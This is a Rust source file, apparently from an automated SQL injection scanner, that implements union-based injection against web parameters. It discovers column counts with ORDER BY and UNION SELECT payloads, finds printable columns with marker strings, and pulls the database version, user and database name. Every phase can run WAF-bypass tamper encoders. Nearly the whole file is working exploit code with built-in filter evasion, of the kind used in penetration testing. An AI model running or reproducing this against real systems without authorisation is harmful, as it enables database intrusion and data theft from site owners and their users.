//! Union-based SQL injection technique: column discovery, printable-column
//! detection, and data extraction — all with optional WAF bypass encoders.

use std::time::Duration;
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    evasion::tamper::{all_techniques, TamperScript},
    evasion::tamper_chain::TamperChain,
    models::{HttpResponse, SqliTestResult, SqliTechnique, UnionExtractedData},
    similarity::{calculate_similarity, detect_php_error, detect_sql_error, extract_value_from_response},
};

impl SqliDetector {
    /// Test for union-based SQL injection (three-phase: column count →
    /// printable columns → data extraction).
    pub(crate) async fn test_union_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
        chain: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        debug!("Testing union-based SQL injection on parameter: {}", param);

        // === PHASE 1: Column Count Discovery ===
        // If a tamper chain is provided (WAF detected), try it first before
        // falling back to the full all_techniques() sweep.
        let techniques = all_techniques();
        let (column_count, bypass_name, active_tamper): (usize, Option<String>, Option<&dyn TamperScript>) =
            if let Some(count) = self
                .discover_column_count_with_bypass(url, param, original_value, None)
                .await
            {
                info!("Found {} columns via ORDER BY", count);
                (count, None, None)
            } else if let Some(ch) = chain.filter(|c| !c.is_empty()) {
                // Chain provided — try it first
                info!("Normal ORDER BY failed, trying provided tamper chain");
                if let Some(count) = self
                    .discover_column_count_with_bypass(url, param, original_value, Some(ch as &dyn TamperScript))
                    .await
                {
                    info!("Found {} columns via ORDER BY (tamper chain)", count);
                    (count, Some("chain".to_string()), Some(ch as &dyn TamperScript))
                } else {
                    // Chain didn't work — fall back to individual techniques
                    info!("Tamper chain failed, trying all WAF bypass techniques");
                    let mut found: Option<(usize, usize)> = None;
                    for (i, t) in techniques.iter().enumerate() {
                        debug!("Trying WAF bypass: {}", t.name());
                        if let Some(count) = self
                            .discover_column_count_with_bypass(url, param, original_value, Some(t.as_ref()))
                            .await
                        {
                            info!("Found {} columns (WAF bypass: {})", count, t.name());
                            found = Some((count, i));
                            break;
                        }
                        tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                    }
                    if let Some((count, idx)) = found {
                        (count, Some(techniques[idx].name().to_string()), Some(techniques[idx].as_ref()))
                    } else {
                        return None;
                    }
                }
            } else {
                info!("Normal ORDER BY failed, trying WAF bypass techniques");
                let mut found: Option<(usize, usize)> = None;
                for (i, t) in techniques.iter().enumerate() {
                    debug!("Trying WAF bypass: {}", t.name());
                    if let Some(count) = self
                        .discover_column_count_with_bypass(url, param, original_value, Some(t.as_ref()))
                        .await
                    {
                        info!("Found {} columns (WAF bypass: {})", count, t.name());
                        found = Some((count, i));
                        break;
                    }
                    tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                }
                if let Some((count, idx)) = found {
                    (count, Some(techniques[idx].name().to_string()), Some(techniques[idx].as_ref()))
                } else {
                    return None;
                }
            };

        let tamper = active_tamper;

        // === PHASE 2: Printable Column Detection ===
        let printable_columns = self
            .detect_printable_columns_with_bypass(
                url, param, original_value, column_count, baseline, tamper,
            )
            .await;

        if printable_columns.is_empty() {
            debug!("No printable columns detected");
        }

        // === PHASE 3: Data Extraction ===
        let extracted_data = if !printable_columns.is_empty() {
            self.extract_union_data_with_bypass(
                url, param, original_value, column_count, &printable_columns, tamper,
            )
            .await
        } else {
            None
        };

        let bypass_info = bypass_name
            .as_ref()
            .map(|n| format!(" (WAF bypass: {})", n))
            .unwrap_or_default();

        let evidence = if let Some(data) = &extracted_data {
            format!(
                "Detected {} columns via ORDER BY{}. Printable columns: {:?}. \
                 Extracted: version='{}', user='{}', db='{}'",
                column_count,
                bypass_info,
                printable_columns,
                data.version.as_deref().unwrap_or("N/A"),
                data.user.as_deref().unwrap_or("N/A"),
                data.database.as_deref().unwrap_or("N/A")
            )
        } else if !printable_columns.is_empty() {
            format!(
                "Detected {} columns via ORDER BY{}. Printable columns: {:?}. \
                 Data extraction was attempted but not successful.",
                column_count, bypass_info, printable_columns
            )
        } else {
            format!(
                "Detected {} columns via ORDER BY{}. Union SELECT successful but \
                 printable columns could not be determined.",
                column_count, bypass_info
            )
        };

        info!("Union-based SQL injection found! Columns: {}", column_count);
        Some(SqliTestResult {
            parameter: param.to_string(),
            technique: SqliTechnique::UnionBased,
            confidence: if extracted_data.is_some() { 0.95 } else { 0.88 },
            payload: format!(
                "{}' UNION SELECT {}-- ",
                original_value,
                (1..=column_count)
                    .map(|n| n.to_string())
                    .collect::<Vec<_>>()
                    .join(",")
            ),
            evidence,
            dbms_hint: extracted_data.as_ref().and_then(|d| d.dbms_hint.clone()),
        })
    }

    // ── Phase 1 ──────────────────────────────────────────────────────────────

    /// Discover column count via ORDER BY + UNION SELECT fallback.
    /// Pass `tamper = None` for a plain request, `Some(t)` to apply a bypass.
    ///
    /// Uses dual-verification: confirms column count by checking that
    /// `ORDER BY N` succeeds and `ORDER BY N+1` fails, reducing false positives
    /// from unrelated SQL errors.
    pub(crate) async fn discover_column_count_with_bypass(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        tamper: Option<&dyn TamperScript>,
    ) -> Option<usize> {
        let encode = |p: &str| match tamper {
            Some(t) => t.tamper(p),
            None => p.to_string(),
        };

        let mut last_successful = 0usize;

        for i in 1..=20usize {
            let order_payload = format!("{}' ORDER BY {}-- ", original_value, i);
            let test_url = self.build_test_url(url, param, original_value, &encode(&order_payload));

            match self.send_request(&test_url).await {
                Ok(response) => {
                    // PHP error = code injection context, not SQLi — abort immediately
                    if detect_php_error(&response.body) && detect_sql_error(&response.body).is_none() {
                        debug!("PHP code injection detected for param={}, aborting union scan", param);
                        return None;
                    }
                    if detect_sql_error(&response.body).is_some() {
                        // ORDER BY i caused an error → column count is i-1
                        // But only if we had at least one successful ORDER BY before
                        if last_successful > 0 {
                            // Verify: ORDER BY (last_successful) should NOT error
                            let verify_payload = format!("{}' ORDER BY {}-- ", original_value, last_successful);
                            let verify_url = self.build_test_url(url, param, original_value, &encode(&verify_payload));
                            match self.send_request(&verify_url).await {
                                Ok(verify_resp) if detect_sql_error(&verify_resp.body).is_none() => {
                                    debug!("ORDER BY {} succeeded, ORDER BY {} failed → {} columns",
                                           last_successful, i, last_successful);
                                    return Some(last_successful);
                                }
                                _ => {}
                            }
                        }
                        return if last_successful > 0 { Some(last_successful) } else { None };
                    }
                    last_successful = i;
                }
                Err(_) => return if last_successful > 0 { Some(last_successful) } else { None },
            }
            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        // UNION SELECT confirmation fallback — requires response to DIFFER from baseline.
        // A parameter that ignores all payloads produces identical responses for every
        // UNION SELECT n → "no SQL error" would always be true → false positive.
        debug!("ORDER BY reached max, performing UNION SELECT confirmation");
        let baseline_url = self.build_test_url(url, param, original_value, original_value);
        let baseline_body = match self.send_request(&baseline_url).await {
            Ok(r) => r.body,
            Err(_) => return None,
        };
        for n in (1..=20usize).rev() {
            let nulls = (0..n).map(|_| "NULL").collect::<Vec<_>>().join(",");
            let union_payload = format!("{}' UNION SELECT {}-- ", original_value, nulls);
            let test_url =
                self.build_test_url(url, param, original_value, &encode(&union_payload));

            match self.send_request(&test_url).await {
                Ok(response) => {
                    // PHP error in UNION fallback = code injection, not SQLi
                    if detect_php_error(&response.body) && detect_sql_error(&response.body).is_none() {
                        debug!("PHP code injection in UNION fallback for param={}, aborting", param);
                        return None;
                    }
                    // Require both: no SQL error AND response differs from baseline.
                    // If identical to baseline the payload had no effect → not injectable.
                    let similarity = calculate_similarity(&baseline_body, &response.body);
                    if detect_sql_error(&response.body).is_none() && similarity < 0.95 {
                        debug!("UNION SELECT confirmed column count: {} (similarity={:.2})", n, similarity);
                        return Some(n);
                    }
                }
                Err(_) => continue,
            }
            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        warn!("Could not determine column count via ORDER BY or UNION SELECT");
        None
    }

    // ── Phase 2 ──────────────────────────────────────────────────────────────

    /// Detect printable columns with optional TamperScript.
    /// Pass `tamper = None` for a plain request.
    ///
    /// Detection uses three signals (any one is sufficient):
    ///   1. Text marker reflected in response body.
    ///   2. Response body differs from all-NULL UNION baseline (length/content change).
    ///   3. HTTP status code differs from baseline status (e.g. login form returning
    ///      302 on successful injection vs 200 on neutral query) — handles cases where
    ///      data is never reflected in the HTML but the status code changes.
    pub(crate) async fn detect_printable_columns_with_bypass(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        column_count: usize,
        baseline: &HttpResponse,
        tamper: Option<&dyn TamperScript>,
    ) -> Vec<usize> {
        let mut printable = Vec::new();

        let encode = |payload: &str| -> String {
            match tamper {
                Some(t) => t.tamper(payload),
                None => payload.to_string(),
            }
        };

        // Pre-compute the all-NULL UNION baseline once for body-diff comparisons.
        let null_payload = format!(
            "{}' UNION SELECT {}-- ",
            original_value,
            (0..column_count).map(|_| "NULL").collect::<Vec<_>>().join(",")
        );
        let encoded_null = encode(&null_payload);
        let null_response = self
            .send_request(&self.build_test_url(url, param, original_value, &encoded_null))
            .await
            .ok();
        tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;

        for col in 1..=column_count {
            let marker = format!("UNION_MARKER_{}", col);
            let nulls_before = col - 1;
            let nulls_after = column_count - col;

            let union_payload = format!(
                "{}' UNION SELECT {}'{}'{}-- ",
                original_value,
                if nulls_before > 0 {
                    format!("{},", "NULL,".repeat(nulls_before).trim_end_matches(','))
                } else {
                    String::new()
                },
                marker,
                if nulls_after > 0 {
                    format!(",{}", "NULL,".repeat(nulls_after).trim_end_matches(','))
                } else {
                    String::new()
                }
            );

            let encoded_payload = encode(&union_payload);
            let test_url = self.build_test_url(url, param, original_value, &encoded_payload);

            match self.send_request(&test_url).await {
                Ok(response) => {
                    // Signal 1: text marker reflected directly in body.
                    if response.body.contains(&marker) {
                        debug!("Column {} is printable (marker found in body)", col);
                        printable.push(col);
                        tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                        continue;
                    }

                    // Signal 2: body differs from all-NULL UNION (content/length change).
                    if let Some(ref null_resp) = null_response {
                        let marker_similarity =
                            calculate_similarity(&null_resp.body, &response.body);
                        if marker_similarity < 0.95 {
                            debug!(
                                "Column {} is printable (body diff vs null baseline: {:.2})",
                                col, marker_similarity
                            );
                            printable.push(col);
                            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
                            continue;
                        }
                    }

                    // Signal 3: HTTP status code change vs original baseline.
                    // Login forms may return 302 on successful UNION injection (auth bypass)
                    // even though no text is reflected. A status change is sufficient evidence.
                    if response.status != baseline.status && response.status < 500 {
                        debug!(
                            "Column {} is printable (status change: {} → {})",
                            col, baseline.status, response.status
                        );
                        printable.push(col);
                    }
                }
                Err(_) => continue,
            }
            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        printable
    }

    // ── Phase 3 ──────────────────────────────────────────────────────────────

    /// Extract actual data with optional TamperScript.
    /// Pass `tamper = None` for a plain request.
    pub(crate) async fn extract_union_data_with_bypass(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        column_count: usize,
        printable_columns: &[usize],
        tamper: Option<&dyn TamperScript>,
    ) -> Option<UnionExtractedData> {
        if printable_columns.is_empty() {
            return None;
        }

        let mut data = UnionExtractedData::default();
        let first_printable = printable_columns[0];

        let dialects = crate::sqx::dbms::all_dialects();

        // Build iteration order: hinted DBMS first, then all others.
        let hint = data.dbms_hint.clone();
        let ordered: Vec<usize> = {
            let mut v = Vec::with_capacity(dialects.len());
            if let Some(ref h) = hint
                && let Some(i) = dialects.iter().position(|d| d.name().eq_ignore_ascii_case(h)) {
                    v.push(i);
                }
            for (i, d) in dialects.iter().enumerate() {
                if hint.as_deref().is_none_or(|h| !d.name().eq_ignore_ascii_case(h)) {
                    v.push(i);
                }
            }
            v
        };

        for idx in ordered {
            let dialect = &dialects[idx];
            let funcs = dialect.union_extraction_functions();
            debug!("Trying {} extraction functions", dialect.name());
            if let Some(extracted) = self
                .try_extract_for_dbms_with_bypass(
                    url, param, original_value, column_count, first_printable,
                    &funcs, dialect.name(), tamper,
                )
                .await
            {
                data = extracted;
                break;
            }
            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        if data.version.is_some() || data.user.is_some() {
            Some(data)
        } else {
            None
        }
    }

    /// Try extraction for a specific DBMS with optional TamperScript.
    /// Pass `tamper = None` for a plain request.
    pub(crate) async fn try_extract_for_dbms_with_bypass(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        column_count: usize,
        printable_col: usize,
        functions: &[&str],
        dbms_name: &str,
        tamper: Option<&dyn TamperScript>,
    ) -> Option<UnionExtractedData> {
        let mut data = UnionExtractedData::default();
        let mut found_any = false;

        let encode = |payload: &str| -> String {
            match tamper {
                Some(t) => t.tamper(payload),
                None => payload.to_string(),
            }
        };

        let mut select_parts: Vec<String> =
            (0..column_count).map(|_| "NULL".to_string()).collect();

        // version
        select_parts[printable_col - 1] = functions[0].to_string();
        let version_payload = format!(
            "{}' UNION SELECT {}-- ",
            original_value,
            select_parts.join(",")
        );
        if let Ok(response) = self
            .send_request(
                &self.build_test_url(url, param, original_value, &encode(&version_payload)),
            )
            .await
            && detect_sql_error(&response.body).is_none()
                && let Some(version) = extract_value_from_response(&response.body) {
                    data.version = Some(version);
                    data.dbms_hint = Some(dbms_name.to_string());
                    found_any = true;
                }
        tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;

        // user
        select_parts[printable_col - 1] = functions[1].to_string();
        let user_payload = format!(
            "{}' UNION SELECT {}-- ",
            original_value,
            select_parts.join(",")
        );
        if let Ok(response) = self
            .send_request(
                &self.build_test_url(url, param, original_value, &encode(&user_payload)),
            )
            .await
            && detect_sql_error(&response.body).is_none()
                && let Some(user) = extract_value_from_response(&response.body) {
                    data.user = Some(user);
                    found_any = true;
                }
        tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;

        // database
        select_parts[printable_col - 1] = functions[2].to_string();
        let db_payload = format!(
            "{}' UNION SELECT {}-- ",
            original_value,
            select_parts.join(",")
        );
        if let Ok(response) = self
            .send_request(
                &self.build_test_url(url, param, original_value, &encode(&db_payload)),
            )
            .await
            && detect_sql_error(&response.body).is_none()
                && let Some(database) = extract_value_from_response(&response.body) {
                    data.database = Some(database);
                    found_any = true;
                }

        if found_any { Some(data) } else { None }
    }
}
